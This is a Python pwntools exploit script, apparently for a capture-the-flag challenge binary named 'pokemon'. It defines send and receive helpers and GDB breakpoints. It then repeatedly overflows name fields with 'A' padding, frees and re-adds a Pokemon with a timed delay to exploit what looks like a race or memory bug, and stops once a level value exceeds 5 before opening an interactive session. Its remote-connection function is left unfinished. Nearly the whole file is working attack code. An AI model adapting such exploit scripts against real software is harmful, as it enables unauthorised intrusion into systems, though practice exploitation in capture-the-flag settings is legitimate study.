#!/usr/bin/python3
from pwn import * 
import time

exe = ELF('./pokemon', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x0000000000001E9D
		brva 0x0000000000001B27
		brva 0x0000000000001BE5
		c
		''')

HOST = 0
PORT = 0

def start():
	if args.REMOTE:
		p = remote(HOST, PORT)
	else:
		p = process(exe.path)
while (True):
	p = process(exe.path)
	for _ in range(4):
		sla(b'Choice: ', b'1')
		sla(b'(0 to cancel): ', b'1')
		sa(b'Pokemon: ', b'A' * 0x1f)

	sla(b'Choice: ', b'2')
	sla(b'(0 to cancel): ', b'1')

	sla(b'Choice: ', b'5')
	sla(b'(0 to cancel): ', b'1')

	sla(b'Choice: ', b'1')
	sla(b'(0 to cancel): ', b'1')
	sleep(2.5)
	sa(b'Pokemon: ', b'A')

	sla(b'Choice: ', b'3')
	ru(b'Level: ')
	level = int(r(1), 10)
	print(level)
	if (level > 5):
		print(level)
		break
	else:
		p.close()
p.interactive()















